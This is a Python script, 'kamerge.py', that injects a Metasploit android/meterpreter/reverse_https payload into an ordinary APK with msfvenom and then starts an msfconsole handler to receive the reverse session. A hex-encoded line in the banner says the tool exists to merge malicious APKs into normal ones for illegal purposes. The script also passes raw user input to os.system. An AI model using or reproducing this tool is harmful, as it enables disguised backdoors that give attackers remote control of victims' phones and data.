"""
kamerge.py - APK payload injector and Metasploit handler launcher
Author: [Your Name]
Description: Command-line tool to inject Metasploit payloads into APKs and automate handler setup.
"""

# === Imports ===
import os  # For running shell commands
import readline  # For enhanced input (history, etc.)
from rich import print  # For colored terminal output

# === Banner and Menus ===
banner = """[red]
██╗  ██╗ █████╗ ███╗   ███╗███████╗██████╗  ██████╗ ███████╗
██║ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝ ██╔════╝
█████╔╝ ███████║██╔████╔██║█████╗  ██████╔╝██║  ███╗█████╗  
██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║   ██║██╔══╝  
██║  ██╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║╚██████╔╝███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝[/red]
61 20 74 6F 6F 6C 20 6D 61 64 65 20 62 79 20 6D 
65 20 74 6F 20 74 75 72 6E 20 69 6E 6A 65 63 74 
20 6F 72 20 6D 65 72 67 65 20 6D 61 6C 69 63 69 
6F 75 73 20 61 70 6B 73 20 69 6E 74 6F 20 61 20 
6E 6F 72 6D 61 6C 20 61 70 6B 20 66 6F 72 20 6E 
6F 6E 20 6C 65 67 61 6C 20 70 75 72 70 6F 73 65 
73 20 0A 49 27 6D 20 6E 6F 74 20 67 61 79 61 20
"""

menu_1 = """    
1. Inject a Metasploit framework payload into an APK with a Metasploit session
2. More help
0. Exit
"""

menu_2 = """
[green]To run this tool you will need:[/green]
1. apktool
2. apksigner
3. zipalign
4. metasploit framework
5. (Optional) Other dependencies
"""

# === Utility Functions ===
def yesorno():
    """Prompt user for a yes/no answer. Returns True for yes, False for no."""
    while True:
        user_input = input("(y/n) : ").strip().lower()
        if user_input in ("y", "yes"):
            return True
        elif user_input in ("n", "no"):
            return False
        else:
            print("Invalid input, please enter 'y' or 'n'.")

def hinput(value_array):
    """Prompt user for a set of values, confirm, and return as a dict."""
    result = {}
    while True:
        # Collect input for each required value
        for item in value_array:
            result[item] = input(f"Set {item}: ")
        # Show summary and confirm
        for item in value_array:
            print(f"{item} is set to {result[item]}")
        print("[yellow]* Are you sure?[/yellow]")
        if yesorno():
            break
        else:
            print("[red]Please re-enter the values.[/red]")
    return result

# === Main Application Logic ===
def main():
    """Main menu loop for kamerge tool."""
    print(banner)
    running = True
    while running:
        print(menu_1)
        choice = input("Enter your choice (default is 1): ").strip()
        if choice == "1" or choice == "":
            print("Injecting a Metasploit framework payload into an APK with a Metasploit session")
            # Gather required options from user
            options = ["ip addr", "port", "apk", "output name"]
            user_input = hinput(options)
            # Build msfvenom command
            command = (
                f"msfvenom -x {user_input['apk']} -p android/meterpreter/reverse_https "
                f"-a dalvik --platform android lhost={user_input['ip addr']} lport={user_input['port']} "
                f"-o {user_input['output name']}.apk"
            )
            print(f"[green]Running command: {command}[/green]")
            os.system(command)
            # Optionally start msfconsole handler
            print("[yellow]Start msfconsole handler?[/yellow]")
            if yesorno():
                handler_cmd = (
                    f"msfconsole -q -x 'use exploit/multi/handler; "
                    f"set payload android/meterpreter/reverse_https; "
                    f"set LHOST {user_input['ip addr']}; set LPORT {user_input['port']}; exploit'"
                )
                os.system(handler_cmd)
        elif choice == "2":
            print(menu_2)
        elif choice == "0":
            print("Exiting...")
            running = False
        else:
            print("Invalid choice, please try again.")

# === Entry Point ===
if __name__ == "__main__":
    main()